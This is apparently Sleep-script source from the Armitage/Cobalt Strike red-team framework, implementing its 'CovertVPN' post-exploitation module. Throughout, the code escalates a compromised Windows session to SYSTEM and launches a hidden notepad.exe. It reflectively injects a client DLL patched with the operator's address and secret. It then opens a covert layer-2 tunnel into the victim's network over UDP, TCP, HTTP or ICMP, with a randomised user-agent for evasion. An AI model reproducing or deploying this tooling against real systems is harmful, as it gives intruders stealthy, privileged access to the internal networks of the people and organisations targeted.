#
# CRUD for CovertVPN Tap
#

import msf.*;
import java.awt.*;
import java.io.*;
import java.net.*;
import javax.swing.*;
import javax.imageio.*;
import ui.*;

import cloudstrike.*;

import tap.*;
import endpoint.*;

# parse output
sub parse_ipconfig {
	local('$process %temp %r $key $value');

	foreach $process (split("\n", $1)) {
		if ($process eq "" && size(%temp) > 0) {
			$key = %temp["Hardware MAC"];
			if ($key !in %r && %temp['IPv4 Address'] ne '127.0.0.1') {
				%r[$key] = %temp;
			}
			%temp = %();
		}
		else if ($process ismatch '(.*?)\s+: (.*)') {
			($key, $value) = matched();
			%temp[$key] = $value;
		}
	}

	if (size(%temp) > 0) {
		$key = %temp["Hardware MAC"];
		if ($key !in %r) {
			%r[$key] = %temp;
		}
	}

	return values(%r);
}

sub refreshInterfaces {
	local('$table $model');
	($table, $model) = @_;
	return fork({
		while (available($source) == 0) {
			local('$interfaces $interface');
			$interfaces = call($mclient, "cloudstrike.list_taps");

			if ($interfaces is $null) {
				print_error("covertvpn.list_taps is null. Are we still connected?");
				return;
			}

			fork({
				dispatchEvent(lambda({
					local('$interface');
					[$table markSelections];
					[$model clear: 16];
					foreach $interface ($interfaces) {
						[$model addEntry: $interface];
					}

					[$model fireListeners];
					[$table restoreSelections];
				}, \$table, \$model, \$interfaces));
			}, \$table, \$model, \$interfaces);

			sleep(1000);
		}
	}, \$table, \$model, \$mclient);
}

sub deployVPN {
	local('$ip $mac $ch $port $secret $hook $quotes $data $dll $int');

	if (%options['VPNInterface'] eq "") {
		showError("Please select or add a VPN interface");
		return;
	}

	$int = %options['VPNInterface'];
	$ip  = [$model getSelectedValueFromColumn: $table, "IPv4 Address"];
	$mac = [$model getSelectedValueFromColumn: $table, "Hardware MAC"];
	
	if ($ip eq "" || $mac eq "") {
		showError("Please select an interface to bridge into");
		return;
	}

	if (%options['CloneMAC'] eq '1') {
		call_async_callback($mclient, "cloudstrike.set_tap_hwaddr", $this, $int, $mac);
		yield;
	}

	call_async_callback($mclient, "cloudstrike.query_tap", $this, %options['VPNInterface']);
	yield;
	$data = convertAll($1);

	($ch, $port, $secret, $hook) = values($data, @('channel', 'port', 'secret', 'hook'));
	if ($ch eq "TCP (Bind)") {
		$ch = 'b';
	}
	else {
		$ch = charAt(lc($ch), 0);
	}

	call_async_callback($mclient, "cloudstrike.export_tap_client", $this, $MY_ADDRESS, $ip, $ch, $port, $secret, $hook);
	yield;
	$dll = convertAll($1);

	# inject our client into notepad.exe
	m_cmd_callback($sid, 'execute -H -f notepad.exe', lambda({
		if ($0 eq "end") {
			if (["$2" trim] ismatch 'Process (\d+) created.*') {
				local('$pid');
				$pid = matched()[0];

				# inject the VPN client...
				call_async($mclient, "module.execute", "post", "windows/manage/reflective_dll_inject", %(PID => "$pid", PATH => "$dll", SESSION => "$sid"));

				# setup a portfwd
				if ($ch eq 'b') {
					m_cmd($sid, "portfwd add -l $port -p $port -r 127.0.0.1");

					# monitor taps for 10m. Kill portfwd if we're connected!
					fork({
						local('$interfaces $finish $temp');
						$finish = ticks() + (60 * 1000 * 10);
						while (ticks() < $finish) {
							$interfaces = call($mclient, "cloudstrike.list_taps");
							foreach $temp ($interfaces) {
								if ($temp['client'] eq '127.0.0.1' && $temp['interface'] eq $int && int($temp['rx']) > 0) {
									[$sess addCommand: $null, "portfwd delete -l $port -p $port -r 127.0.0.1"];
									$finish = 0;
								}
							}
							sleep(10 * 1000);
						}
					}, \$mclient, \$sid, \$int, $sess => session($sid), \$port);
				}

				showError("Injected CovertVPN client into $pid $+ . Try to interact\nwith interface $int $+ .");
				elog("deployed $int VPN client to $ip $+ / $+ $sid");
			}
		}
	}, \$int, \$sid, \$dll, \$ip, \$port, \$ch));
}

sub chooseVPN {
	thread(lambda({
		local('$panel $dialog $interfaces $table $model $scroll $a $b $generate $middle $help');
		local('@functions %options $middle');

		# this *really* should be the default unless the user knows what they're doing
		%options['CloneMAC'] = 1;

		$dialog = dialog("Deploy VPN Client", 480, 240);
		$panel = [new JPanel];
		[$panel setLayout: [new BorderLayout]];

		# users table...
		($table, $model) = setupTable("IPv4 Address", @("IPv4 Address", "IPv4 Netmask", "Hardware MAC"), @());

		$scroll = [new JScrollPane: $table];
		[$scroll setPreferredSize: [new Dimension: [$scroll getWidth], 100]];

		# grab our info..
		%handlers["ipconfig"] = lambda({
			if ($0 eq "end") {
				local('$entry');
				[$model clear: 16];
				foreach $entry (parse_ipconfig($2)) {
					if ($entry['Hardware MAC'] ne "00:00:00:00:00:00" && $entry['Hardware MAC'] ne "FF:FF:FF:FF:FF:FF" && $entry["IPv4 Address"] ne "") {
						[$model addEntry: $entry];
					}
				}
				[$model fireListeners];
			}
		}, \$table, \$model);
		m_cmd($sid, "ipconfig");

		# setup the dialog...
		push(@functions, tableFunction($table, $model));

		$a = rowLayout(ui:interface("Local Interface: ", "VPNInterface", @functions, %options));
		$b = ui:checkbox("Clone host MAC address", "CloneMAC", @functions, %options);

		$generate = ui:action("Deploy", @functions, %options, $dialog, lambda({
			m_cmd($sid, "getsystem");
			m_cmd_callback($sid, "getuid", lambda({
				if ($0 eq "end") {
					if ("*AUTHORITY*SYSTEM*" !iswm $2) {
						showError("You must deploy CovertVPN as SYSTEM\nTry getsystem -t 0 to escalate your privileges");
					}
					else {
						[lambda(&deployVPN, \$sid, \$table, \$model, \%options)];
					}
				}
			}, \$sid, \$table, \$model, %options => $1));
		}, \$sid, \$table, \$model));

		$help = [new JButton: "Help"];
		[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-covert-vpn")];

		#
		# build the form
		#
		$middle = [new JPanel];
		[$middle setLayout: [new BorderLayout]];
		[$middle add: $a, [BorderLayout NORTH]];
		[$middle add: $b, [BorderLayout CENTER]];
		[$middle add: center($generate, $help), [BorderLayout SOUTH]];

		[$dialog add: $scroll, [BorderLayout CENTER]];
		[$dialog add: $middle, [BorderLayout SOUTH]];

		[$dialog setVisible: 1];		
	}, $sid => $1));
}

global('$intno');
$intno = 0;

sub addInterface {
	local('$a @functions %options $generate $help $dialog $e');

	# first byte of MAC address must be even or else it will be rejected
	# and our interface will go away. *sigh*
	$e = rand(255);
	$e = iff(($e % 2) == 1, $e + 1, $e);

	%options['INTERFACE'] = "phear $+ $intno";
	$intno++;
	%options['HWADDRESS'] = join(":", unpack("HHHHHH",  chr($e) . chr(rand(255)) . chr(rand(255)) . chr(rand(255)) . chr(rand(255)) . chr(rand(255))));
	%options['PORT']      = randomPort();
	%options['CHANNEL']   = "UDP";

	# the meat of the form...
	$a = [new JPanel];
	matrixLayout($a, @(
		ui:text("Interface:",      "INTERFACE",   @functions, %options),
		ui:text("MAC Address:",    "HWADDRESS",   @functions, %options),
		ui:text("Local Port: *"  , "PORT",        @functions, %options),
		ui:combobox("Channel:",    "CHANNEL",     @functions, %options, @("HTTP", "ICMP", "TCP (Bind)", "TCP (Reverse)", "UDP"))
	), 3);

	# set up the dialog.
	$dialog = dialog("Setup Interface", 640, 480);
	[$dialog setLayout: [new BorderLayout]];

	# buttons...
	$generate = ui:action("Launch", @functions, %options, $dialog, lambda({
		[lambda({
			local('$result');
			call_async_callback($mclient, "cloudstrike.start_tap", $this, %options['INTERFACE'], %options['HWADDRESS'], %options['PORT'], %options['CHANNEL']);
			yield;
			$result = convertAll($1); 
			dispatchEvent(lambda({
				[$callback : $result, %options['INTERFACE']];
			}, \$callback, \$result, \%options));
		}, %options => $1, $event => $2, \$callback)];
	}, $callback => $1));

	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-covert-vpn")];

	# display the form...
	[$dialog add: description("Start a network interface and listener for CovertVPN. When a CovertVPN client is deployed, you will have a layer 2 tap into your target's network."), [BorderLayout NORTH]];
	[$dialog add: $a, [BorderLayout CENTER]];
	[$dialog add: center($generate, $help), [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}

sub listInterfaces {
	local('$dialog $table $model $add $delete $help $timer');
	$dialog = [new JPanel];
	[$dialog setLayout: [new BorderLayout]];

	($table, $model) = setupTable("interface", @("interface", "channel", "port", "mac", "client", "tx", "rx"), @());
	[$table setSelectionMode: [ListSelectionModel SINGLE_INTERVAL_SELECTION]];
	
	[$dialog add: [new JScrollPane: $table], [BorderLayout CENTER]];

	$add = [new JButton: "Add"];
	$delete = [new JButton: "Remove"];
	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-covert-vpn")];

	$timer = refreshInterfaces($table, $model);

	[$add addActionListener: lambda({
		addInterface(lambda({
			if ($1 !is $null && $1['status'] eq 'success') {
				showError("Interface Started");
			}
			else {
				showError($1['status']);
			}
			refreshInterfaces($table, $model);
		}, \$table, \$model));		
	}, \$table, \$model)];

	[$delete addActionListener: lambda({
		[lambda({
			local('@names $name');
			@names = [$model getSelectedValues: $table];
			foreach $name (@names) {
				call_async_callback($mclient, "cloudstrike.stop_tap", $this, $name);
				yield;
			}
			refreshInterfaces($table, $model);
		}, \$table, \$model)];
	}, \$table, \$model)];

	[$dialog add: center($add, $delete, $help), [BorderLayout SOUTH]];
	[$frame addTab: "Interfaces", $dialog, lambda({
		writeb($timer, 1);
	}, \$timer)];
}

sub dropFile {
	local('$handle $data $file $home');
	$handle = [SleepUtils getIOHandle: resource($1), $null];
	$data = readb($handle, -1);
	closef($handle);

	$file = [[java.io.File createTempFile: $2, $3] getAbsolutePath];
	$handle = openf("> $+ $file");
	writeb($handle, $data);
	closef($handle);

        return $file . "";
}

sub api_start_tap {
	local('$int $mac $port $channel $secret $tap $server $www');
	($int, $mac, $port, $channel) = $2;

	if ($int in %vpn || $int in %tap) {
		return %(status => "$int is already defined");
	}

	if ($mac !ismatch '[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}') {
		return %(status => "invalid mac address");
	}

	try {
		# load our library if we need to
		if (%tap['_loaded'] is $null) {
			if ("*64*" iswm systemProperties()['os.arch']) {
				# 64bit tapmanager library
				[System load: dropFile("libtapmanager64.so", "cobalt_tapmanager", ".so")];
			}
			else {
				[System load: dropFile("libtapmanager.so", "cobalt_tapmanager", ".so")];
			}
			%tap['_loaded'] = 1;
		}

		$secret = [[new java.security.SecureRandom] getSeed: 16];
		$tap = [new EncryptedTap: $int, cast($secret, 'b')];

		# set the MAC address of this tap.
		[$tap setHWAddress: cast(pack("HHHHHH", reverse(split(':', $mac))), 'b')];

		%vpn[$int] = %(mac => $mac, secret => $secret, channel => $channel, port => $port, interface => $int, client => "not connected");

		if ($channel eq "UDP") {
			$server = [new UDP: $tap, int($port)];
		}
		else if ($channel eq "TCP (Bind)") {
			$server = [new TCP: $tap, int($port), false];
		}
		else if ($channel eq "TCP (Reverse)") {
			$server = [new TCP: $tap, int($port), true];
		}
		else if ($channel eq "HTTP") {
			if ($port !in %servers) {
				%servers[$port] = [new WebServer: int($port)];
				[%servers[$port] addWebListener: &serverHit];
			}
			$www = %servers[$port];
			%vpn[$int]['hook'] = substr(lc(unpack("H*", digest(ticks() . rand(), "MD5"))[0]), 0, 4) . ".json";

			$server = [new HTTP: $tap];
			[$server setup: $www, %vpn[$int]['hook']];
		}
		else if ($channel eq "ICMP") {
			global('$icmp');

			# load our ICMP API...
			if ($icmp is $null) {
				if ("*64*" iswm systemProperties()['os.arch']) {
					# 64bit tapmanager library
					[System load: dropFile("libicmp64.so", "icmp", ".so")];
				}
				else {
					[System load: dropFile("libicmp.so", "icmp", ".so")];
				}

				$icmp = [new icmp.Server];
			}

			# create a hook that we will use to uniquely define our VPN session...
			%vpn[$int]['hook'] = substr(lc(unpack("H*", digest(ticks() . rand(), "MD5"))[0]), 0, 4);

			$server = [new ICMP: $tap];
			[$icmp addIcmpListener: %vpn[$int]['hook'], $server];
		}

		%tap[$int] = $tap;
		%srv[$int] = $server;
	}
	catch $exception {
		if ($tap !is $null) {	
			[$tap stop];
		}
		%vpn[$int] = $null;
		%tap[$int] = $null;
		%srv[$int] = $null;
		return %(status => $exception);
	}
	return %(status => "success");
}

sub api_stop_tap {
	local('$int $tap');
	$int = $2[0];
	if ($int in %srv) {
		$tap = %srv[$int];
		[$tap quit]; # signals remote end to disconnect and exit
	}
	%tap[$int] = $null;
	%srv[$int] = $null;
	%vpn[$int] = $null;
	return %(status => "success");
}

sub api_hwaddr_tap {
	# update the Tap's HW address
	local('$int $tap $mac');
	($int, $mac) = $2;
	if ($int in %tap) {
		$tap = %tap[$int];
		[$tap setHWAddress: cast(pack("HHHHHH", reverse(split(':', $mac))), 'b')];
		%vpn[$int]['mac'] = $mac;
	}
	return %(status => "success");
}

sub api_list_taps {
	local('$key $value $tap $srv');
	foreach $key => $value (%vpn) {
		$tap = %tap[$key];
		$srv = %srv[$key];
		if ([$tap isActive]) {
			$value['client'] = [$tap getRemoteHost];
			$value['tx']     = [$srv getTransmittedBytes];
			$value['rx']     = [$srv getReceivedBytes];
		}
	}

	return values(%vpn);
}

sub api_query_tap {
	return %vpn[$2[0]];
}

sub api_export_tap {
	local('$vpnclient $handle $data $index $patch $MY_ADDRESS $ip $ch $port $secret $hook');
	($MY_ADDRESS, $ip, $ch, $port, $secret, $hook) = $2;

	# build up our VPN client
	$vpnclient  = dropFile("resources/covertvpn.dll", "convertvpn", ".dll");

	$handle = openf($vpnclient);
	$data   = readb($handle, -1);
	closef($handle);

	# patch in the arguments
	$patch   = pack("Z16 Z16 Z8 Z8 Z32 Z32",
			"$MY_ADDRESS $+ \x00",
			"$ip $+ \x00",
			$ch,
			"$port $+ \x00",
			$secret,
			"$hook $+ \x00");

	$index = indexOf($data, "AAAABBBBCCCCDDDDEEEEFFFF");
	$data = replaceAt($data, $patch, $index);

	# substitute user-agent from C2 profile
	$index = indexOf($data, "AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOO");
	$data = replaceAt($data, randua() . "\x00", $index);

	# ok, write it out...
	$handle = openf("> $+ $vpnclient");
	writeb($handle, $data);
	closef($handle); 

	return $vpnclient;
}
